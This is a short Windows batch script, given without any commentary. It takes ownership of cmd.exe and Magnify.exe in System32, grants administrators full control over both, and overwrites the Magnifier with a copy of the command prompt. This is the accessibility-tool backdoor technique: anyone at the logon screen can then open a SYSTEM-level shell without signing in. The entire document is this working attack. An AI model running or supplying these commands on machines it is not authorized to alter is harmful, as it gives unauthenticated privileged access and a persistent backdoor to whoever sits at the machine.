copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\cmd.back
copy /Y C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify.back

takeown /F C:\Windows\System32\cmd.exe
takeown /F C:\Windows\System32\Magnify.exe

cacls C:\Windows\System32\cmd.exe /E /G administrators:F
cacls C:\Windows\System32\Magnify.exe /E /G administrators:F

copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe